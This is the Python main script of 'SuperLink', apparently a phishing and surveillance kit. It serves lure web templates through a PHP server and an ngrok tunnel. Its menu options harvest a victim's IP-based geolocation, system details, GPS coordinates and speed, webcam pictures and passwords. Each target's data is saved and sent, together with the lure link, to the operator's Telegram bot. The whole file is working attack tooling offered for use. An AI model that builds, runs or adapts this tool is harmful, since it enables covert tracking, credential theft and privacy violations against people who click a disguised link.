from json import loads
from os import getcwd, getlogin, listdir, name, stat, system
from pathlib import Path
from platform import uname
from subprocess import Popen
from sys import exit
from time import sleep

from colorama import Fore, init
from pyngrok import ngrok

from Modules.checkConfig import CheckConfigFile
from Modules.clearData import DeleteFilesAndDirs
from Modules.data2image import Data2Image
from Modules.editIndexFile import EditIndexFile
from Modules.geoip import GeolocationIP
from Modules.loadTemplates import loadTemplatePath
from Modules.notifier import TelegramBot
from Modules.timeOptions import TimeOptions

LG = Fore.LIGHTGREEN_EX  # light green
LR = Fore.LIGHTRED_EX  # light red
LY = Fore.LIGHTYELLOW_EX  # light yellow
LW = Fore.LIGHTWHITE_EX  # light white
LC = Fore.LIGHTCYAN_EX  # light cyan
LB = Fore.LIGHTBLUE_EX  # light blue
Y = Fore.YELLOW  # yellow

if name == "nt":
    try:
        from win10toast import ToastNotifier
    except ModuleNotFoundError:
        print(
            LR + " [!] 'win10toast' is not installed! | Installation: pip install win10toast==0.9")
        exit()
    try:
        import neofetch_win
    except ModuleNotFoundError:
        print(
            LR + " [!] 'neofetch-win' is not installed! | Installation: pip install neofetch-win==1.1.5.1")
        exit()
else:
    pass


def banner():
    script_title = "SuperLink - V1.0 - By IHosseini"
    TMsettitle(script_title)
    TMcleaner()
    neofetch()


def win10notif(
        title: str,
        msg: str,
        icon: str = None,
        duration: int = 5,
        threaded: bool = False):
    sys_info = uname()
    user_system = sys_info[0]
    system_release = sys_info[2]
    if user_system != "Windows":
        pass
    else:
        if system_release != "10":
            pass
        else:
            notify = ToastNotifier()
            notify.show_toast(title, msg, icon, duration, threaded)

def neofetch():
    system("neofetch -c green -ac red" if name == "nt" else "neofetch")


def TMsettitle(title: str):
    system(f"title {title}")


def TMcleaner():
    system("cls" if name == "nt" else "clear")


def listFiles(dir_path: str = None):
    if dir_path is None:
        files = listdir(".")
        num_files = 1
        for file in files:
            print(f" {num_files} --> " + file)
            num_files += 1
    else:
        files = listdir(dir_path)
        if len(files) != 0:
            num_files = 1
            for file in files:
                print(f" {num_files} --> " + file)
                num_files += 1
        else:
            print(" [>] There is no file to show!")


def makedirs():
    Path("./Logs/PHP-Log").mkdir(parents=True, exist_ok=True)
    Path("./Logs/Saved-IP").mkdir(parents=True, exist_ok=True)
    Path("./Logs/Saved-Info").mkdir(parents=True, exist_ok=True)
    Path("./Target-Data").mkdir(parents=True, exist_ok=True)
    Path("./Webcam-Images").mkdir(parents=True, exist_ok=True)


def cwdir():
    cwd = getcwd()
    user_system = uname()[0]
    if user_system != "Windows":
        cwd = cwd.split("/")[-1]
    else:
        cwd = cwd.split("\\")[-1]
    return cwd


def press_enter():
    input("\n\n" + LG + " [" + LR + "!" + LG + "]" + LW +
          " Press [" + LR + "ENTER" + LW + "] to continue... ")


def getRedirLink():
    username = getlogin()
    cwd = cwdir()
    proto_li = ["http://", "https://"]
    banner()
    sleep(0.1)
    print("\n" + LG + " [" + LR + "!" + LG + "]" + LW + " Press [" + LB + "Ctrl+C" + LW + "] to exit.")
    sleep(0.1)
    print("\n\n" + LG + " [" + LR + "!" + LG + "]" + LB + " Please enter the URL.")
    redir_link = input("\n" + LG + " ┌─(" + LC + f"{username}" + LR + "@" +
                       LC + "SuperLink" + LG + ")─[" + LC + f"./{cwd}" + LG + "]" + """
 └──╼/# """ + LW + "")
    if len(redir_link) == 0:
        return None
    else:
        for p in proto_li:
            redir_link = redir_link.replace(p, "")
        return redir_link


def home_options():
    banner()
    sleep(0.1)
    print("\n" + LG + " [" + LR + "!" + LG + "]" + LW + " Press [" + LB + "Ctrl+C" + LW + "] to exit.")
    sleep(0.1)
    print("\n\n" + LG + " [" + LR + "01" + LG + "]" + LB + " Get target GeoIP and Sys info")
    sleep(0.1)
    print(LG + " [" + LR + "02" + LG + "]" + LB + " Get target location data (Lat, Long, Speed, ....)")
    sleep(0.1)
    print(LG + " [" + LR + "03" + LG + "]" + LB + " Redirect target to another URL")
    sleep(0.1)
    print(LG + " [" + LR + "04" + LG + "]" + LB + " Webcam access & take a picture")
    sleep(0.1)
    print(LG + " [" + LR + "05" + LG + "]" + LB + " Password grabber (only Win10)")
    sleep(0.1)
    print(LG + " [" + LR + "06" + LG + "]" + LB + " Show all targets data files")
    sleep(0.1)
    print(LG + " [" + LR + "07" + LG + "]" + LB + " Wipe out all previous targets data (IMG & TXT)\n")
    sleep(0.1)
    print(LG + " [" + LR + "99" + LG + "]" + LY + " Quit :(\n")
    sleep(0.1)


def start():
    icons_path = "./Modules/icons/"
    username = getlogin()
    cwd = cwdir()
    _del_ = DeleteFilesAndDirs()
    tprint = TMprint()
    while True:
        try:
            init()
            makedirs()
            home_options()
            opt = str(input("\n" + LG + " ┌─(" + LC + f"{username}" + LR + "@" +
                            LC + "SuperLink" + LG + ")─[" + LC + f"./{cwd}" + LG + "]" + """
 └──╼/# """ + LW + ""))
            temps = loadTemplatePath()
            if opt == "":
                continue
            elif opt == "01":
                EditIndexFile(temps.loadPath("1")).ChangeToGetDataFile()
                MainServer(temps.loadPath("1")).create_data_link()
            elif opt == "02":
                MainServer(temps.loadPath("4")).create_data_link()
            elif opt == "03":
                rd_link = getRedirLink()
                if rd_link is None:
                    print("\n" + LG + " [" + LR + "!" + LG + "]" + LY + " Have not entered any URL!")
                    press_enter()
                else:
                    EditIndexFile(temps.loadPath("1"), redir_link=rd_link).ChangeToRedirFile()
                    MainServer(temps.loadPath("1")).create_data_link()
            elif opt == "04":
                MainServer(temps.loadPath("2")).create_data_link()
            elif opt == "05":
                MainServer(temps.loadPath("3")).create_data_link()
            elif opt == "06":
                print("\n" + LC + " [>] TXT Files: \n" + LY)
                listFiles("./Target-Data")
                print("\n" + LC + " [>] Webcam IMG Files: \n" + LY)
                listFiles("./Webcam-Images")
                press_enter()
            elif opt == "07":
                banner()
                print("\n")
                tprint.out(LG + " [>] Deleting targets files... ")
                sleep(3)
                _del_.deleteAllFilesByType("txt", "./Target-Data")
                _del_.deleteAllFilesByType("png", "./Target-Data")
                _del_.deleteAllFilesByType("png", "./Webcam-Images")
                tprint.out(LG + " [>] Targets files deleted successfully! ")
                win10notif("Files deleted!", 
                           "All of the targets files (TXT & IMG) have been successfully deleted!",
                           icon=icons_path + "trash_empty.ico")
                press_enter()
                continue
            elif opt == "99":
                TMcleaner()
                break
            else:
                print("\n" + LG + " [" + LR + "!" + LG + "]" + LY + " Your entry is not available in the options!")
                press_enter()
        except Exception as error:
            print("\n\n" + LR + " [#start] ERROR : " + str(error))
            press_enter()
            TMcleaner()
            break
        except KeyboardInterrupt:
            TMcleaner()
            break


class TMprint:
    def __init__(self):
        self.max_len = 0

    def out(self, text):
        if len(text) > self.max_len:
            self.max_len = len(text)
        else:
            text += (" " * (self.max_len - len(text)))
        print(text, end='\r')


class MainServer:
    def __init__(self, template_path, port=None, proto=None):
        self.conf_file = CheckConfigFile()
        self.def_port = "4040"
        self.def_proto = "http"
        self.port = port
        self.template_path = template_path
        self.proto = proto
        self.ngrok_auth_token = self.conf_file.loadToken
        self.ngrok_region = self.conf_file.loadRegion
        self.bot_token = self.conf_file.loadBotToken
        self.user_chat_id = self.conf_file.loadChatId
        self.telebot = TelegramBot(self.bot_token, self.user_chat_id)
        self.tprint = TMprint()
        self.time_opt = TimeOptions()

    def create_data_link(self):
        banner()
        icons_path = "./Modules/icons/"
        print("\n\n")
        self.tprint.out(LG + " [>] Processing...")
        sleep(3)
        template_name = self.template_path.split("/")[2]
        self.tprint.out(LG + " [>] Checking port & protocol...")
        sleep(3)
        if self.proto is None:
            proto = self.def_proto
        else:
            proto = self.proto
        if self.port is None:
            port = self.def_port
        else:
            port = self.port
        try:
            self.tprint.out(LG + " [>] Starting PHP server on port" + LW + f" ({port})")
            sleep(3)
            with open("./Logs/PHP-Log/PHP_SERVER_LOG.log", "w") as php_log:
                Popen(("php", "-S", f"localhost:{port}", "-t", self.template_path),
                      stderr=php_log, stdout=php_log)
                self.tprint.out(LG + " [>] Generating the link...")
                link = str(ngrok.connect(port, proto,
                                         region=self.ngrok_region,
                                         auth_token=self.ngrok_auth_token))
                local_mode = link.split(" ")[3].replace('"', '')
                link = link.replace("http", "https")
                link = link.split(" ")[1]
                link = link.replace('"', '')
                self.tprint.out(LG + " [>] All done!")
                win10notif("Server started!",
                           f"PHP & Ngrok server successfully started on port ({port})",
                           icon=icons_path + "green_check.ico")
                self.tprint.out(LG + " [>] Template Name : " + LW + template_name)
                sleep(0.4)
                print("\n\n" + LG + " [>] Your Link : " + LW + link)
                sleep(0.4)
                print("\n" + LG + " [>] Localhost Mode : " + LW + local_mode + "\n")
                sleep(0.4)
                self.tprint.out(LG + " [>] Sending the link to your" + LW + " telegram" + LG + " ... ")
                try:
                    self.telebot.sendMessage(
                        f"✅ New link created!\n\n🌐 Template name : {template_name}\n🔗 Link : {link}" + 
                        f"\n🕐 Time : {self.time_opt.calendar} {self.time_opt.clock}")
                    self.tprint.out(
                        LG + " [>] The link have been sent to your " + LW + "telegram" + LG + " successfully!\n")
                except:
                    self.tprint.out(LR + " [>]" + LY + " Faild to send the link to your " +
                                    LW + "telegram " + LY + "!")
                    print("")
                print(LR + "\n --------------------------------- \n")
                print(LG + " [!] You can close the server by pressing" +
                      LW + " [" + LR + "Ctrl+C" + LW + "]" + LG + " ... \n")
                self.getUserData()
        except Exception as error:
            if "The ngrok process errored on start" in str(error):
                print("\n\n" + LY + " [!] Something went wrong while creating the link!\n")
            else:
                print("\n\n" + LR + " [#MainServer] ERROR : " + str(error))
            self.telebot.sendMessage(f"❌ Link expired!\n\n🌐 Template name : {template_name}" + 
                                     f"\n🕐 Time : {self.time_opt.calendar} {self.time_opt.clock}")
            press_enter()
            self.kill_php()
            ngrok.kill()
        except KeyboardInterrupt:
            self.telebot.sendMessage(f"❌ Link expired!\n\n🌐 Template name : {template_name}" + 
                                     f"\n🕐 Time : {self.time_opt.calendar} {self.time_opt.clock}")
            self.kill_php()

    @staticmethod
    def kill_php():
        TMcleaner()
        if name != "nt":
            pass
        else:
            with open("./Logs/PHP-Log/TERMINATE_PHP_LOG.log", "w") as kill_process:
                Popen(("taskkill", "/F", "/IM", "php*"), stdout=kill_process, stderr=kill_process)

    @staticmethod
    def get_ip_addr():
        file_path_ip = "./Logs/Saved-IP/IP-Address.txt"
        if stat(file_path_ip).st_size != 0:
            with open(file_path_ip, "r") as ip_file:
                file_lines = ip_file.readlines()
                TARGET_IP = file_lines[-1]
            return TARGET_IP
        else:
            return None

    def getUserData(self):
        template_name = self.template_path.split("/")[2]
        icons_path = "./Modules/icons/"
        temp_path_li = ["./Templates/Music Player", "./Templates/Smiling Moon",
                        "./Templates/NearYou", "./Templates/Camera (Webcam access)",
                        "./Templates/Password grabber (Win10)",
                        "./Templates/Weather forcast"]
        tprint = TMprint()
        number_of_target = 1
        file_path_info = "./Logs/Saved-Info/Info.json"
        file_path_ip = "./Logs/Saved-IP/IP-Address.txt"
        file_path_loc = "./Logs/Saved-Info/Loc-Info.json"
        while True:
            try:
                TARGET_IP = self.get_ip_addr()
                if TARGET_IP is not None:
                    win10notif("Target detected!", 
                               "New target opened the link!",
                               icons_path + "devilish_earth.ico")
                    target_data_file = f"./Target-Data/{self.time_opt.calendar}_T{number_of_target}.txt"
                    if "149.154" in TARGET_IP:
                        pass
                    else:
                        tprint.out(LY + " <! " + LB + "-----" + LY +
                                   f" {number_of_target} " + LB + "-----" + LY + " !> ")
                        print(LG + f"\n\n [>] IP   : " + LW + f"{TARGET_IP}" +
                              LG + " [>] Time : " + LW + f"{self.time_opt.calendar} | {self.time_opt.clock}")
                        with open(file_path_ip, "w") as clean_ip_file:
                            clean_ip_file.write("")
                    tprint.out(LG + " [>] Saving target GeoIP data... ")
                    sleep(2)
                    if stat(file_path_info).st_size != 0:
                        with open(file_path_info, "r") as info_file:
                            info_content = info_file.read()
                        info_data = loads(info_content)["info"]
                        ip_data = GeolocationIP(TARGET_IP)
                        ip_data = ip_data.getData
                        full_target_data = implement_userdata(info_data, ip_data)
                        with open(target_data_file, "w") as target_info:
                            target_info.write(full_target_data)
                        tprint.out(LG + f" [>] Target GeoIP data successfully saved in" +
                                   LW + f" [{target_data_file}]" + LG + " &" + 
                                   LW + f" [./Target-Data/IMG_T{number_of_target}.png]")
                        print("")
                    else:
                        tprint.out(LG + " [>] Target GeoIP data could not be saved!")
                        print("")
                    if self.template_path == temp_path_li[3]:
                        print(LG + " [>] New images will be available in " + LW + "[./Webcam-Images]")
                    elif self.template_path == temp_path_li[-2]:
                        print(LG + " [>] If you catch any passwords, they will be in " + 
                              LW + f"[./Target-Data/{self.time_opt.calendar}_PASSWDS.txt]")
                    elif self.template_path == temp_path_li[-1]:
                        if stat(file_path_loc).st_size != 0:
                            tprint.out(LG + " [>] Saving target Location data... ")
                            sleep(2)
                            with open(file_path_loc, "r") as loc_file:
                                loc_content = loc_file.read()
                            loc_data = loads(loc_content)["loc_info"]
                            latitude = loc_data["latitude"]
                            longitude = loc_data["longitude"]
                            accuracy = loc_data["accuracy"]
                            altitude = loc_data["altitude"]
                            direction = loc_data["direction"]
                            speed = loc_data["speed"]
                            with open(target_data_file, "a") as target_info:
                                target_info.write("\n\n[------ Location Info ------] \n\n" +
                                                  f"-> Latitude : {latitude}\n-> Longitude : {longitude}\n" +
                                                  f"-> Altitude : {altitude}\n-> Speed : {speed}\n" +
                                                  f"-> Direction : {direction}\n-> Accuracy : {accuracy}\n" +
                                                  f"-> Google Maps Link : google.com/maps/place/{latitude}+{longitude}")
                            with open(file_path_loc, "w") as loc_file:
                                loc_file.write("")
                            tprint.out(LG + " [>] Target Location data successfully appended to " +
                                       LW + f"[{target_data_file}]")
                            print("")
                        else:
                            tprint.out(LG + " [>] Target Location data could not be saved!")
                            print("")
                    else:
                        continue
                    try:
                        tprint.out(LG + " [>] Sending target data to your" + LW + " telegram" + LG + " ...")
                        with open(target_data_file, "r") as data:
                            imagedata = Data2Image(f"./Target-Data/IMG_T{number_of_target}.png")
                            imagedata.write_image(data.read().replace("------", ""), "./Modules/fonts/arial.ttf", 
                                                  25, "RGB", (1024, 1024), (250, 97, 97), 
                                                  (255, 255, 255))
                            self.telebot.sendDocument(target_data_file, 
                                                      caption=f"*Target Number* `{number_of_target}`\n" +
                                                      f"*Template name* : `{template_name}`\n" 
                                                      f"*Time* : {self.time_opt.calendar} {self.time_opt.clock}", 
                                                      parse_mode="Markdown")
                        tprint.out(LG + " [>] Data file successfully sent to your" + LW + " telegram"+ LG + " !")
                        print("")
                    except:
                        tprint.out(LR + " [>]" + LY + " Faild to send the target data to your " +
                                   LW + "telegram " + LY + "! (check your connection)")
                        print("")
                    win10notif("Data successfully saved!",
                               f"Target data successfully saved in [{target_data_file}]",
                               icon=icons_path + "download_folder.ico")
                    print("")
                    tprint.out(LG + " [>] " + LC + "Waiting for other " + LR + "targets" +
                               LC + " interaction... ")
                    number_of_target += 1
                else:
                    continue
            except Exception as error:
                print("\n\n" + LR + " [#getUserData] ERROR : " + str(error))
                exit()

    
def implement_userdata(info_data: dict, ip_data: dict):
    full_target_data = "[------ GeolocationIP Info ------] \n\n" \
                        f"-> IP : {ip_data['ip']}\n-> City : {ip_data['city']}\n" \
                        f"-> Region : {ip_data['region']}\n-> Country : {ip_data['country']}\n" \
                        f"-> Location : {ip_data['location']}\n-> ISP : {ip_data['isp']}\n" \
                        f"-> Post Code : {ip_data['postal']}\n-> Time Zone : {ip_data['time_zone']}\n" \
                        "\n[------ System Info ------] \n\n" \
                        f"-> OS Name : {info_data['OS-Name']}\n-> OS Version : {info_data['OS-Version']}\n" \
                        f"-> Browser : {info_data['Browser-Name']} {info_data['Browser-Version']}\n" \
                        f"-> Device : {info_data['Device-Name']}\n-> Device-Memory : {info_data['Device-Memory']}\n"\
                        f"-> CPU Architecture : {info_data['CPU-Architecture']}\n" \
                        f"-> Number Of CPU Cores : {info_data['CPU-Cores']}\n" \
                        f"-> Screen Resolution : {info_data['Device-Resolution']}\n" \
                        f"-> Time Zone : {info_data['Time-Zone']}\n-> Language : {info_data['User-Language']}\n" \
                        f"-> User-Agent : {info_data['User-Agent']}"
    return full_target_data


if __name__ == "__main__":
    start()